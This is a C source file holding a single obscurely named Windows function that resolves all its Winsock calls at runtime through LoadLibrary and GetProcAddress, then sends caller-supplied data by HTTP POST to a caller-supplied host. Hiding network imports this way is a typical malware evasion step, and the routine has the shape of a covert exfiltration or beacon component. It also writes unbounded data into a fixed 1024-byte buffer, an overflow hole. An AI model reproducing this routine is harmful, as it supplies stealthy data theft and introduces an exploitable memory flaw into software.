#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

typedef int (WSAAPI* pWSAStartup)(WORD, LPWSADATA);
typedef int (WSAAPI* pgetaddrinfo)(PCSTR, PCSTR, const ADDRINFOA*, ADDRINFOA**);
typedef SOCKET (WSAAPI* psocket)(int, int, int);
typedef int (WSAAPI* pconnect)(SOCKET, const struct sockaddr*, int);
typedef int (WSAAPI* psend)(SOCKET, const char*, int, int);
typedef int (WSAAPI* precv)(SOCKET, char*, int, int);
typedef int (WSAAPI* pclosesocket)(SOCKET);
typedef int (WSAAPI* pWSACleanup)(void);
typedef void (WSAAPI* pfreeaddrinfo)(PADDRINFOA);
void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* host, const char* path, const char* data){
    HMODULE h = LoadLibraryA("ws2_32.dll");
    if (!h) return;

    pWSAStartup f1 = (pWSAStartup)GetProcAddress(h, "WSAStartup");
    pgetaddrinfo f2 = (pgetaddrinfo)GetProcAddress(h, "getaddrinfo");
    psocket f3 = (psocket)GetProcAddress(h, "socket");
    pconnect f4 = (pconnect)GetProcAddress(h, "connect");
    psend f5 = (psend)GetProcAddress(h, "send");
    precv f6 = (precv)GetProcAddress(h, "recv");
    pclosesocket f7 = (pclosesocket)GetProcAddress(h, "closesocket");
    pWSACleanup f8 = (pWSACleanup)GetProcAddress(h, "WSACleanup");
    pfreeaddrinfo f9 = (pfreeaddrinfo)GetProcAddress(h, "freeaddrinfo");

    WSADATA wd;
    if (f1(0x0202, &wd) == 0) {
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (f2(host, "80", &hints, &res) == 0) {
            SOCKET s = f3(res->ai_family, res->ai_socktype, res->ai_protocol);
            if (s != (SOCKET)-1) {
                if (f4(s, res->ai_addr, (int)res->ai_addrlen) != -1) {
                    char buf[1024];
                    wsprintfA(buf, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s", path, host, (int)strlen(data), data);
                    f5(s, buf, (int)strlen(buf), 0);
                    while (f6(s, buf, 1024, 0) > 0);
                }
                f7(s);
            }
            f9(res);
        }
        f8();
    }
    FreeLibrary(h);
}